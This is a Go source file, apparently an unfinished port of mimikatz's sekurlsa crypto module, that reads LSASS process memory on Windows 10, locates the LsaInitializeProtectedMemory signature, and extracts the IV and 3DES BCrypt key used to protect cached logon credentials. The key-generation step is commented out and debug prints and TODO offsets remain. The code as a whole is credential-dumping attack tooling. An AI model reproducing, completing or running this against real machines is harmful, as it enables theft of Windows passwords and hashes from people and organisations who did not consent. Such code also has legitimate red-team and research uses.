package kiwi

import (
	"bytes"
	"fmt"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/convert"
	"project/internal/module/windows/api"
)

var (
	win10LSAInitializeProtectedMemoryKey = []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8D,
		0x45, 0xE0, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8D, 0x15} // 67, -89, 16
)

type bcryptHandleKey struct {
	size     uint32
	tag      uint32  // R U U U
	hAlg     uintptr // algorithm handle
	key      uintptr // bcryptKey
	unknown0 uintptr
}

type bcryptKey81 struct {
	size     uint32
	tag      uint32 // K S S M
	typ      uint32
	unknown0 uint32
	unknown1 uint32
	unknown2 uint32
	unknown3 uint32
	unknown4 uint32
	unknown5 uintptr // before, align in x64
	unknown6 uint32
	unknown7 uint32
	unknown8 uint32
	unknown9 uint32
	hardKey  hardKey
}

type hardKey struct {
	cbSecret uint32
	data     [4]byte // self append
}

func (kiwi *Kiwi) searchMemory(pHandle windows.Handle, address uintptr, length int) error {
	memory := make([]byte, length)
	_, err := api.ReadProcessMemory(pHandle, address, &memory[0], uintptr(length))
	if err != nil {
		return errors.WithMessage(err, "failed to search memory")
	}

	// address1 += 4 + uintptr(offset64)

	index := bytes.Index(memory, win10LSAInitializeProtectedMemoryKey)

	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0/
	// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c

	address2 := address + uintptr(index) + 67 // TODO off0
	fmt.Printf("5, %X\n", address2)

	var offset2 uint32
	_, err = api.ReadProcessMemory(pHandle, address2, (*byte)(unsafe.Pointer(&offset2)), unsafe.Sizeof(offset2))
	if err != nil {
		return errors.WithMessage(err, "failed to read iv")
	}

	address2 += 4 + uintptr(offset2)
	fmt.Printf("6, %X\n", address2)

	iv := make([]byte, 16)
	_, err = api.ReadProcessMemory(pHandle, address2, &iv[0], uintptr(16))
	if err != nil {
		return errors.WithMessage(err, "failed to search iv")
	}
	fmt.Println(iv)

	address3 := address + uintptr(index) - 89 // TODO off1
	fmt.Printf("7, %X\n", address3)
	kiwi.nt6RequireKey(pHandle, address+uintptr(index)-89)
	address3 = address + uintptr(index) + 16 // TODO off2
	fmt.Printf("7, %X\n", address3)
	kiwi.nt6RequireKey(pHandle, address3)
	return nil
}

func (kiwi *Kiwi) nt6RequireKey(pHandle windows.Handle, address3 uintptr) error {
	var offset3 int32
	_, err := api.ReadProcessMemory(pHandle, address3, (*byte)(unsafe.Pointer(&offset3)), unsafe.Sizeof(offset3))
	if err != nil {
		return errors.WithMessage(err, "failed to search iv")
	}
	fmt.Println(convert.LEInt32ToBytes(offset3))

	address3 += 4 + uintptr(offset3)
	var bhkAddr uintptr
	_, err = api.ReadProcessMemory(pHandle, address3, (*byte)(unsafe.Pointer(&bhkAddr)), unsafe.Sizeof(bhkAddr))
	if err != nil {
		return errors.WithMessage(err, "failed to search iv")
	}
	fmt.Printf("8, %X\n", bhkAddr)

	var bhk bcryptHandleKey
	_, err = api.ReadProcessMemory(pHandle, bhkAddr, (*byte)(unsafe.Pointer(&bhk)), unsafe.Sizeof(bhk))
	if err != nil {
		return errors.WithMessage(err, "failed to read bcrypt handle key")
	}
	fmt.Println(bhk)

	var bk81 bcryptKey81
	_, err = api.ReadProcessMemory(pHandle, bhk.key, (*byte)(unsafe.Pointer(&bk81)), unsafe.Sizeof(bk81))
	if err != nil {
		return errors.WithMessage(err, "failed to read bcrypt handle key")
	}
	fmt.Println(bk81)

	hardKeyData := make([]byte, int(bk81.hardKey.cbSecret))
	addr1 := bhk.key + unsafe.Offsetof(bcryptKey81{}.hardKey) + unsafe.Offsetof(hardKey{}.data)
	_, err = api.ReadProcessMemory(pHandle, addr1, &hardKeyData[0], uintptr(len(hardKeyData)))
	if err != nil {
		return errors.WithMessage(err, "failed to read bcrypt handle key")
	}
	fmt.Println("hard key data:", hardKeyData)

	fmt.Println(bhk.size)
	fmt.Println(bk81.size)

	algHandle, err := api.BCryptOpenAlgorithmProvider("3DES", "", 0)
	if err != nil {
		return errors.WithMessage(err, "failed to open bcrypt handle key")
	}

	var phKey uintptr

	buf1 := make([]byte, int(bhk.size+bk81.size))

	// err = api.BCryptGenerateSymmetricKey(algHandle, &phKey, &buf1[0], uint32(len(buf1)), &hardKeyData[0], bk81.hardKey.cbSecret, 0)
	// if err != nil {
	// 	return errors.WithMessage(err, "failed to open bcrypt handle key")
	// }
	fmt.Println(algHandle)

	fmt.Println(phKey)
	fmt.Println(buf1)

	// bgk := bcryptGenKey{
	// 	algProvider: algHandle,
	// 	key:         phKey,
	// 	pKey:        buf1,
	// 	cbKey:       uint32(len(buf1)),
	// }

	// 558

	// 654

	return nil
}
